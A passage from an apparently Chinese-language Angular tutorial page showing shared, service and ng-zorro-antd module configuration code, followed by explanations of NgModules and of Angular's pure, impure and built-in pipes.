
@<span class="token function">NgModule</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  providers<span class="token operator">:</span> <span class="token punctuation">[</span>
    <span class="token punctuation">{</span>provide<span class="token operator">:</span> <span class="token constant">API_CONFIG</span><span class="token punctuation">,</span> useValue<span class="token operator">:</span> environment<span class="token punctuation">.</span>production <span class="token operator">?</span> <span class="token string">'/'</span> <span class="token operator">:</span> <span class="token string">'/api/'</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token comment">// 配置api环境常量</span>
    <span class="token punctuation">{</span>
      provide<span class="token operator">:</span> <span class="token constant">WINDOW</span><span class="token punctuation">,</span> <span class="token function">useFactory</span><span class="token punctuation">(</span><span class="token parameter">platformId<span class="token operator">:</span> object</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token function">isPlatformBrowser</span><span class="token punctuation">(</span>platformId<span class="token punctuation">)</span> <span class="token operator">?</span> window <span class="token operator">:</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span><span class="token punctuation">,</span>
      deps<span class="token operator">:</span> <span class="token punctuation">[</span><span class="token constant">PLATFORM_ID</span><span class="token punctuation">]</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token comment">// 自定义注入window，兼容服务端渲染，angular默认提供了DOCUMENT注入令牌可以注入document</span>
    <span class="token punctuation">{</span>provide<span class="token operator">:</span> <span class="token constant">HTTP_INTERCEPTORS</span><span class="token punctuation">,</span> useClass<span class="token operator">:</span> BaseInterceptor<span class="token punctuation">,</span> multi<span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token comment">// 全局请求拦截器用来定义前后端公用响应反馈提示和token等</span>
  <span class="token punctuation">]</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">ServicesModule</span> <span class="token punctuation">{</span>
<span class="token punctuation">}</span>
<span class="token comment">// shared.module.ts</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span>NgModule<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/core'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span>CommonModule<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/common'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span>ReactiveFormsModule<span class="token punctuation">,</span> FormsModule<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/forms'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span>RouterModule<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/router'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span>DragDropModule<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/cdk/drag-drop'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span>registerLocaleData<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/common'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> zh <span class="token keyword">from</span> <span class="token string">'@angular/common/locales/zh'</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token punctuation">{</span>AttachmentShowModalModule<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'components-qkc'</span><span class="token punctuation">;</span> <span class="token comment">// 全局跨项目自定义组件</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span>ResourcePreviewModalModule<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'components-qkc'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span>ClipboardModule<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'ngx-clipboard'</span><span class="token punctuation">;</span> <span class="token comment">// 第三方组件</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span>NgZorroAntdModule<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'components-qkc/ng-zorro-antd.module'</span><span class="token punctuation">;</span> <span class="token comment">// 全局ui组件zorro</span>

<span class="token keyword">import</span> <span class="token punctuation">{</span>
  AtrErrorImgDirective<span class="token punctuation">,</span>
  AtrRoleDirective<span class="token punctuation">,</span>
  ClickoutsideDirective<span class="token punctuation">,</span>
  StopPropagationDirective<span class="token punctuation">,</span>
  ImgDefaultDirective<span class="token punctuation">,</span>
  QkcSpinDirective<span class="token punctuation">,</span>
  FullscreenDirective<span class="token punctuation">,</span>
  HighlightDirective<span class="token punctuation">,</span>
  DebounceClickDirective<span class="token punctuation">,</span>
  EqualValidator<span class="token punctuation">,</span> ExeBackgroundDirective<span class="token punctuation">,</span>
  ExeIfDirective<span class="token punctuation">,</span>
  ExeButtonPressDirective
<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'core/directive'</span><span class="token punctuation">;</span> <span class="token comment">// 指令</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span>
  SafeHtmlPipe<span class="token punctuation">,</span>
  DayPipe<span class="token punctuation">,</span>
  RestypePipe<span class="token punctuation">,</span>
  ChinaDatePipe<span class="token punctuation">,</span>
  AgoPipe<span class="token punctuation">,</span>
  PlayCountPipe<span class="token punctuation">,</span>
  RepeatPipe<span class="token punctuation">,</span>
  WelcomePipe
<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'core/pipe'</span><span class="token punctuation">;</span> <span class="token comment">//管道</span>

<span class="token keyword">import</span> <span class="token punctuation">{</span>
  UploadComponent<span class="token punctuation">,</span>
  TreeComponent<span class="token punctuation">,</span>
  ProfessionLabelComponent<span class="token punctuation">,</span>
  ProfessionLabelInputComponent<span class="token punctuation">,</span>
  ProfessionLabelItemComponent<span class="token punctuation">,</span>
  ProfessionLabelAddComponent<span class="token punctuation">,</span>
  ProfessionLabelDrawerComponent<span class="token punctuation">,</span>
  CourseMemberComponent<span class="token punctuation">,</span>
  RoleMemberComponent<span class="token punctuation">,</span>
  ChangeProfessionComponent<span class="token punctuation">,</span>
  CustomCheckboxComponent<span class="token punctuation">,</span>
  TagSelectComponent<span class="token punctuation">,</span>
  QkcUploadComponent<span class="token punctuation">,</span>
  VerificationCodeComponent<span class="token punctuation">,</span>
  PackTreeComponent<span class="token punctuation">,</span>
  ChangeTrainComponent<span class="token punctuation">,</span>
  QkcTrainTreeComponent<span class="token punctuation">,</span>
  QkcResTagComponent<span class="token punctuation">,</span>
  TreeKnowledgegraphComponent<span class="token punctuation">,</span>
  SimpleKnowledgegraphTreeComponent<span class="token punctuation">,</span>
  ServiceProviderComponent<span class="token punctuation">,</span>
  DisciplineDataComponent<span class="token punctuation">,</span>
<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'./'</span><span class="token punctuation">;</span> <span class="token comment">// 全局自定义公用组件</span>

<span class="token function">registerLocaleData</span><span class="token punctuation">(</span>zh<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> <span class="token constant">THIRDMODULES</span> <span class="token operator">=</span> <span class="token punctuation">[</span>
  AttachmentShowModalModule<span class="token punctuation">,</span>
  ResourcePreviewModalModule<span class="token punctuation">,</span>
  ClipboardModule<span class="token punctuation">,</span>
  NgZorroAntdModule<span class="token punctuation">,</span>
<span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> <span class="token constant">COMPONENTS</span> <span class="token operator">=</span> <span class="token punctuation">[</span>
  UploadComponent<span class="token punctuation">,</span> SimpleKnowledgegraphTreeComponent<span class="token punctuation">,</span>
  TreeComponent<span class="token punctuation">,</span> ProfessionLabelComponent<span class="token punctuation">,</span> ProfessionLabelInputComponent<span class="token punctuation">,</span>
  ProfessionLabelItemComponent<span class="token punctuation">,</span> ProfessionLabelAddComponent<span class="token punctuation">,</span> ProfessionLabelDrawerComponent<span class="token punctuation">,</span>
  CourseMemberComponent<span class="token punctuation">,</span> RoleMemberComponent<span class="token punctuation">,</span> ChangeProfessionComponent<span class="token punctuation">,</span> CustomCheckboxComponent<span class="token punctuation">,</span>
  TagSelectComponent<span class="token punctuation">,</span> QkcUploadComponent<span class="token punctuation">,</span> VerificationCodeComponent<span class="token punctuation">,</span> QkcResTagComponent<span class="token punctuation">,</span>
  PackTreeComponent<span class="token punctuation">,</span> ChangeTrainComponent<span class="token punctuation">,</span> QkcTrainTreeComponent<span class="token punctuation">,</span> TreeKnowledgegraphComponent<span class="token punctuation">,</span>
  ServiceProviderComponent<span class="token punctuation">,</span> DisciplineDataComponent<span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> <span class="token constant">DIRECTIVES</span> <span class="token operator">=</span> <span class="token punctuation">[</span>AtrRoleDirective<span class="token punctuation">,</span> AtrErrorImgDirective<span class="token punctuation">,</span>
  QkcSpinDirective<span class="token punctuation">,</span> FullscreenDirective<span class="token punctuation">,</span>
  ClickoutsideDirective<span class="token punctuation">,</span> HighlightDirective<span class="token punctuation">,</span> StopPropagationDirective<span class="token punctuation">,</span>
  ImgDefaultDirective<span class="token punctuation">,</span> DebounceClickDirective<span class="token punctuation">,</span> EqualValidator<span class="token punctuation">,</span>
  ExeBackgroundDirective<span class="token punctuation">,</span> ExeIfDirective<span class="token punctuation">,</span>
  ExeButtonPressDirective<span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> <span class="token constant">PIPES</span> <span class="token operator">=</span> <span class="token punctuation">[</span>DayPipe<span class="token punctuation">,</span> ChinaDatePipe<span class="token punctuation">,</span> RestypePipe<span class="token punctuation">,</span> SafeHtmlPipe<span class="token punctuation">,</span> PlayCountPipe<span class="token punctuation">,</span> AgoPipe<span class="token punctuation">,</span> RepeatPipe<span class="token punctuation">,</span> WelcomePipe<span class="token punctuation">]</span><span class="token punctuation">;</span>

@<span class="token function">NgModule</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  imports<span class="token operator">:</span> <span class="token punctuation">[</span>
    CommonModule<span class="token punctuation">,</span>
    FormsModule<span class="token punctuation">,</span>
    ReactiveFormsModule<span class="token punctuation">,</span>
    RouterModule<span class="token punctuation">,</span>
    DragDropModule<span class="token punctuation">,</span>
    <span class="token operator">...</span><span class="token constant">THIRDMODULES</span><span class="token punctuation">,</span>
  <span class="token punctuation">]</span><span class="token punctuation">,</span>
  declarations<span class="token operator">:</span> <span class="token punctuation">[</span>
    <span class="token operator">...</span><span class="token constant">COMPONENTS</span><span class="token punctuation">,</span>
    <span class="token operator">...</span><span class="token constant">DIRECTIVES</span><span class="token punctuation">,</span>
    <span class="token operator">...</span><span class="token constant">PIPES</span>
  <span class="token punctuation">]</span><span class="token punctuation">,</span>
  exports<span class="token operator">:</span> <span class="token punctuation">[</span>
    CommonModule<span class="token punctuation">,</span>
    FormsModule<span class="token punctuation">,</span>
    ReactiveFormsModule<span class="token punctuation">,</span>
    DragDropModule<span class="token punctuation">,</span>
    RouterModule<span class="token punctuation">,</span>
    <span class="token operator">...</span><span class="token constant">COMPONENTS</span><span class="token punctuation">,</span>
    <span class="token operator">...</span><span class="token constant">DIRECTIVES</span><span class="token punctuation">,</span>
    <span class="token operator">...</span><span class="token constant">PIPES</span><span class="token punctuation">,</span>
    <span class="token operator">...</span><span class="token constant">THIRDMODULES</span><span class="token punctuation">,</span>
  <span class="token punctuation">]</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">SharedModule</span> <span class="token punctuation">{</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br><span class="line-number">52</span><br><span class="line-number">53</span><br><span class="line-number">54</span><br><span class="line-number">55</span><br><span class="line-number">56</span><br><span class="line-number">57</span><br><span class="line-number">58</span><br><span class="line-number">59</span><br><span class="line-number">60</span><br><span class="line-number">61</span><br><span class="line-number">62</span><br><span class="line-number">63</span><br><span class="line-number">64</span><br><span class="line-number">65</span><br><span class="line-number">66</span><br><span class="line-number">67</span><br><span class="line-number">68</span><br><span class="line-number">69</span><br><span class="line-number">70</span><br><span class="line-number">71</span><br><span class="line-number">72</span><br><span class="line-number">73</span><br><span class="line-number">74</span><br><span class="line-number">75</span><br><span class="line-number">76</span><br><span class="line-number">77</span><br><span class="line-number">78</span><br><span class="line-number">79</span><br><span class="line-number">80</span><br><span class="line-number">81</span><br><span class="line-number">82</span><br><span class="line-number">83</span><br><span class="line-number">84</span><br><span class="line-number">85</span><br><span class="line-number">86</span><br><span class="line-number">87</span><br><span class="line-number">88</span><br><span class="line-number">89</span><br><span class="line-number">90</span><br><span class="line-number">91</span><br><span class="line-number">92</span><br><span class="line-number">93</span><br><span class="line-number">94</span><br><span class="line-number">95</span><br><span class="line-number">96</span><br><span class="line-number">97</span><br><span class="line-number">98</span><br><span class="line-number">99</span><br><span class="line-number">100</span><br><span class="line-number">101</span><br><span class="line-number">102</span><br><span class="line-number">103</span><br><span class="line-number">104</span><br><span class="line-number">105</span><br><span class="line-number">106</span><br><span class="line-number">107</span><br><span class="line-number">108</span><br><span class="line-number">109</span><br><span class="line-number">110</span><br><span class="line-number">111</span><br><span class="line-number">112</span><br><span class="line-number">113</span><br><span class="line-number">114</span><br><span class="line-number">115</span><br><span class="line-number">116</span><br><span class="line-number">117</span><br><span class="line-number">118</span><br><span class="line-number">119</span><br><span class="line-number">120</span><br><span class="line-number">121</span><br><span class="line-number">122</span><br><span class="line-number">123</span><br><span class="line-number">124</span><br><span class="line-number">125</span><br><span class="line-number">126</span><br><span class="line-number">127</span><br><span class="line-number">128</span><br><span class="line-number">129</span><br><span class="line-number">130</span><br><span class="line-number">131</span><br><span class="line-number">132</span><br><span class="line-number">133</span><br><span class="line-number">134</span><br><span class="line-number">135</span><br><span class="line-number">136</span><br><span class="line-number">137</span><br><span class="line-number">138</span><br><span class="line-number">139</span><br></div></div><h3 id="zorro11组件模块"><a href="#zorro11组件模块" class="header-anchor">#</a> zorro11组件模块</h3> <p>使用路由懒加载需要注意分割的模块应该注入相对应的zorro模块（该模块组件使用过哪些zorro模块就注入那些），通常我们封装的自定义公用组件都为一个模块，应为angular不允许我们在两个模块注入同一个组件，而且这样易于代码分割。</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>// ng-zorro-antd.module.ts
import { NgModule } from '@angular/core';
import { NzAffixModule } from 'ng-zorro-antd/affix';
import { NzAlertModule } from 'ng-zorro-antd/alert';
import { NzAnchorModule } from 'ng-zorro-antd/anchor';
import { NzAutocompleteModule } from 'ng-zorro-antd/auto-complete';
import { NzAvatarModule } from 'ng-zorro-antd/avatar';
import { NzBackTopModule } from 'ng-zorro-antd/back-top';
import { NzBadgeModule } from 'ng-zorro-antd/badge';
import { NzBreadCrumbModule } from 'ng-zorro-antd/breadcrumb';
import { NzButtonModule } from 'ng-zorro-antd/button';
import { NzCalendarModule } from 'ng-zorro-antd/calendar';
import { NzCardModule } from 'ng-zorro-antd/card';
import { NzCarouselModule } from 'ng-zorro-antd/carousel';
import { NzCascaderModule } from 'ng-zorro-antd/cascader';
import { NzCheckboxModule } from 'ng-zorro-antd/checkbox';
import { NzCollapseModule } from 'ng-zorro-antd/collapse';
import { NzCommentModule } from 'ng-zorro-antd/comment';
import { NzNoAnimationModule } from 'ng-zorro-antd/core/no-animation';
import { NzTransButtonModule } from 'ng-zorro-antd/core/trans-button';
import { NzWaveModule } from 'ng-zorro-antd/core/wave';
import { NzDatePickerModule } from 'ng-zorro-antd/date-picker';
import { NzDescriptionsModule } from 'ng-zorro-antd/descriptions';
import { NzDividerModule } from 'ng-zorro-antd/divider';
import { NzDrawerModule } from 'ng-zorro-antd/drawer';
import { NzDropDownModule } from 'ng-zorro-antd/dropdown';
import { NzEmptyModule } from 'ng-zorro-antd/empty';
import { NzFormModule } from 'ng-zorro-antd/form';
import { NzGridModule } from 'ng-zorro-antd/grid';
import { NzI18nModule } from 'ng-zorro-antd/i18n';
import { NzIconModule } from 'ng-zorro-antd/icon';
import { NzInputModule } from 'ng-zorro-antd/input';
import { NzInputNumberModule } from 'ng-zorro-antd/input-number';
import { NzLayoutModule } from 'ng-zorro-antd/layout';
import { NzListModule } from 'ng-zorro-antd/list';
import { NzMentionModule } from 'ng-zorro-antd/mention';
import { NzMenuModule } from 'ng-zorro-antd/menu';
import { NzMessageModule } from 'ng-zorro-antd/message';
import { NzModalModule } from 'ng-zorro-antd/modal';
import { NzNotificationModule } from 'ng-zorro-antd/notification';
import { NzPageHeaderModule } from 'ng-zorro-antd/page-header';
import { NzPaginationModule } from 'ng-zorro-antd/pagination';
import { NzPopconfirmModule } from 'ng-zorro-antd/popconfirm';
import { NzPopoverModule } from 'ng-zorro-antd/popover';
import { NzProgressModule } from 'ng-zorro-antd/progress';
import { NzRadioModule } from 'ng-zorro-antd/radio';
import { NzRateModule } from 'ng-zorro-antd/rate';
import { NzResultModule } from 'ng-zorro-antd/result';
import { NzSelectModule } from 'ng-zorro-antd/select';
import { NzSkeletonModule } from 'ng-zorro-antd/skeleton';
import { NzSliderModule } from 'ng-zorro-antd/slider';
import { NzSpinModule } from 'ng-zorro-antd/spin';
import { NzStatisticModule } from 'ng-zorro-antd/statistic';
import { NzStepsModule } from 'ng-zorro-antd/steps';
import { NzSwitchModule } from 'ng-zorro-antd/switch';
import { NzTableModule } from 'ng-zorro-antd/table';
import { NzTabsModule } from 'ng-zorro-antd/tabs';
import { NzTagModule } from 'ng-zorro-antd/tag';
import { NzTimePickerModule } from 'ng-zorro-antd/time-picker';
import { NzTimelineModule } from 'ng-zorro-antd/timeline';
import { NzToolTipModule } from 'ng-zorro-antd/tooltip';
import { NzTransferModule } from 'ng-zorro-antd/transfer';
import { NzTreeModule } from 'ng-zorro-antd/tree';
import { NzTreeSelectModule } from 'ng-zorro-antd/tree-select';
import { NzTypographyModule } from 'ng-zorro-antd/typography';
import { NzUploadModule } from 'ng-zorro-antd/upload';
import { NzResizableModule } from 'ng-zorro-antd/resizable';
import { NzSpaceModule } from 'ng-zorro-antd/space';

@NgModule({
  exports: [
    NzAffixModule,
    NzAlertModule,
    NzAnchorModule,
    NzAutocompleteModule,
    NzAvatarModule,
    NzBackTopModule,
    NzBadgeModule,
    NzButtonModule,
    NzBreadCrumbModule,
    NzCalendarModule,
    NzCardModule,
    NzCarouselModule,
    NzCascaderModule,
    NzCheckboxModule,
    NzCollapseModule,
    NzCommentModule,
    NzDatePickerModule,
    NzDescriptionsModule,
    NzDividerModule,
    NzDrawerModule,
    NzDropDownModule,
    NzEmptyModule,
    NzFormModule,
    NzGridModule,
    NzI18nModule,
    NzIconModule,
    NzInputModule,
    NzInputNumberModule,
    NzLayoutModule,
    NzListModule,
    NzMentionModule,
    NzMenuModule,
    NzMessageModule,
    NzModalModule,
    NzNoAnimationModule,
    NzNotificationModule,
    NzPageHeaderModule,
    NzPaginationModule,
    NzPopconfirmModule,
    NzPopoverModule,
    NzProgressModule,
    NzRadioModule,
    NzRateModule,
    NzResultModule,
    NzSelectModule,
    NzSkeletonModule,
    NzSliderModule,
    NzSpinModule,
    NzStatisticModule,
    NzStepsModule,
    NzSwitchModule,
    NzTableModule,
    NzTabsModule,
    NzTagModule,
    NzTimePickerModule,
    NzTimelineModule,
    NzToolTipModule,
    NzTransButtonModule,
    NzTransferModule,
    NzTreeModule,
    NzTreeSelectModule,
    NzTypographyModule,
    NzUploadModule,
    NzWaveModule,
    NzResizableModule,
    NzSpaceModule
  ]
})
export class NgZorroAntdModule {
}
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br><span class="line-number">52</span><br><span class="line-number">53</span><br><span class="line-number">54</span><br><span class="line-number">55</span><br><span class="line-number">56</span><br><span class="line-number">57</span><br><span class="line-number">58</span><br><span class="line-number">59</span><br><span class="line-number">60</span><br><span class="line-number">61</span><br><span class="line-number">62</span><br><span class="line-number">63</span><br><span class="line-number">64</span><br><span class="line-number">65</span><br><span class="line-number">66</span><br><span class="line-number">67</span><br><span class="line-number">68</span><br><span class="line-number">69</span><br><span class="line-number">70</span><br><span class="line-number">71</span><br><span class="line-number">72</span><br><span class="line-number">73</span><br><span class="line-number">74</span><br><span class="line-number">75</span><br><span class="line-number">76</span><br><span class="line-number">77</span><br><span class="line-number">78</span><br><span class="line-number">79</span><br><span class="line-number">80</span><br><span class="line-number">81</span><br><span class="line-number">82</span><br><span class="line-number">83</span><br><span class="line-number">84</span><br><span class="line-number">85</span><br><span class="line-number">86</span><br><span class="line-number">87</span><br><span class="line-number">88</span><br><span class="line-number">89</span><br><span class="line-number">90</span><br><span class="line-number">91</span><br><span class="line-number">92</span><br><span class="line-number">93</span><br><span class="line-number">94</span><br><span class="line-number">95</span><br><span class="line-number">96</span><br><span class="line-number">97</span><br><span class="line-number">98</span><br><span class="line-number">99</span><br><span class="line-number">100</span><br><span class="line-number">101</span><br><span class="line-number">102</span><br><span class="line-number">103</span><br><span class="line-number">104</span><br><span class="line-number">105</span><br><span class="line-number">106</span><br><span class="line-number">107</span><br><span class="line-number">108</span><br><span class="line-number">109</span><br><span class="line-number">110</span><br><span class="line-number">111</span><br><span class="line-number">112</span><br><span class="line-number">113</span><br><span class="line-number">114</span><br><span class="line-number">115</span><br><span class="line-number">116</span><br><span class="line-number">117</span><br><span class="line-number">118</span><br><span class="line-number">119</span><br><span class="line-number">120</span><br><span class="line-number">121</span><br><span class="line-number">122</span><br><span class="line-number">123</span><br><span class="line-number">124</span><br><span class="line-number">125</span><br><span class="line-number">126</span><br><span class="line-number">127</span><br><span class="line-number">128</span><br><span class="line-number">129</span><br><span class="line-number">130</span><br><span class="line-number">131</span><br><span class="line-number">132</span><br><span class="line-number">133</span><br><span class="line-number">134</span><br><span class="line-number">135</span><br><span class="line-number">136</span><br><span class="line-number">137</span><br><span class="line-number">138</span><br><span class="line-number">139</span><br><span class="line-number">140</span><br><span class="line-number">141</span><br></div></div><h3 id="ngmodules-esmodules-libraries"><a href="#ngmodules-esmodules-libraries" class="header-anchor">#</a> NgModules/esModules/libraries</h3> <blockquote><p>Angular模块（NgModules） vs. JavaScript 模块 vs Angular 库（Angular libraries）</p></blockquote> <p>一个普通的esmodule通过import/export导入导出。NgModule经过 Angular 编译器，可以通过把服务提供商加到 @NgModule.providers 列表中，来用服务扩展整个应用，并且指定导入导出共享模块的哪些部分。</p> <p>Angular内置库模块名字都带有 @angular 前缀。Angular库模块通过 npm 包管理工具安装，通过 import 声明语句来导入他们中的部分内容，或导入Angular模块（NgModules）。比如，从 @angular/core 库模块中导入 Angular 的 Component 装饰器：<code>import { Component } from '@angular/core';</code>，导入基础模块`import { BrowserModule } from '@angular/platform-browser'。Angular库模块是angular模块的集合体。</p> <p>总的来说，javascript模块也可以在angular中使用自由。</p> <h2 id="管道"><a href="#管道" class="header-anchor">#</a> 管道</h2> <h3 id="angular管道分类"><a href="#angular管道分类" class="header-anchor">#</a> angular管道分类</h3> <ul><li>pure 管道：仅当管道输入值变化的时候，才执行转换操作，默认的类型是 pure 类型。（备注：输入值变化是指原始数据类型如：string、number、boolean 等的数值或对象的引用值发生变化）。</li> <li>impure 管道：在每次变化检测期间都会执行，如鼠标点击或移动都会执行 impure 管道。</li></ul> <div class="custom-block tip"><p class="custom-block-title">温馨提示</p> <p>使用 impure 管道时候要小心，很可能触发非常频繁。</p></div> <h3 id="所有内置管道"><a href="#所有内置管道" class="header-anchor">#</a> 所有内置管道</h3> <blockquote><p>UpperCasePipe</p></blockquote> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token operator">&lt;</span>p<span class="token operator">&gt;</span><span class="token punctuation">{</span><span class="token punctuation">{</span> <span class="token string">'Angular'</span> <span class="token operator">|</span> uppercase <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token operator">&lt;</span><span class="token operator">/</span>p<span class="token operator">&gt;</span> <span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span> Output<span class="token operator">:</span> <span class="token constant">ANGULAR</span> <span class="token operator">--</span><span class="token operator">&gt;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><blockquote><p>LowerCasePipe</p></blockquote> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token operator">&lt;</span>p<span class="token operator">&gt;</span><span class="token punctuation">{</span><span class="token punctuation">{</span> <span class="token string">'Angular'</span> <span class="token operator">|</span> lowercase <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token operator">&lt;</span><span class="token operator">/</span>p<span class="token operator">&gt;</span> <span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span> Output<span class="token operator">:</span> angular <span class="token operator">--</span><span class="token operator">&gt;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><blockquote><p>TitleCasePipe</p></blockquote> <p>将每个单词的第一个字母大写，并将单词的其余部分转换为小写。单词由任何空格字符分隔，例如空格，制表符或换行符。</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code> <span class="token operator">&lt;</span>p<span class="token operator">&gt;</span><span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token string">'one,two,three'</span> <span class="token operator">|</span> titlecase<span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token operator">&lt;</span><span class="token operator">/</span>p<span class="token operator">&gt;</span> <span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span> output is expected to be <span class="token string">&quot;One,two,three&quot;</span> <span class="token operator">--</span><span class="token operator">&gt;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><blockquote><p>DecimalPipe number_expression | number[:digitInfo]</p></blockquote> <p>digitInfo是如下个格式：{minIntegerDigits}.{minFractionDigits}-{maxFractionDigits}；</p> <ul><li>minIntegerDigits：要使用的最小数字的整数位数。默认为1；</li> <li>minFractionDigits：小数点后的最小位数。默认为0；</li> <li>maxFractionDigits：小数点后的最大位数。默认为3；</li></ul> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token comment">// 保留1位整数4位小数</span>
 <span class="token operator">&lt;</span>p<span class="token operator">&gt;</span><span class="token punctuation">{</span><span class="token punctuation">{</span> <span class="token number">3.14159265</span> <span class="token operator">|</span> number<span class="token operator">:</span> <span class="token string">'1.4-4'</span> <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token operator">&lt;</span><span class="token operator">/</span>p<span class="token operator">&gt;</span> <span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span> Output<span class="token operator">:</span> <span class="token number">3.1416</span>  接收的参数格式为<span class="token punctuation">{</span>最少整数位数<span class="token punctuation">}</span><span class="token punctuation">.</span><span class="token punctuation">{</span>最少小数位数<span class="token punctuation">}</span><span class="token operator">-</span><span class="token punctuation">{</span>最多小数位数<span class="token punctuation">}</span>  <span class="token operator">--</span><span class="token operator">&gt;</span>
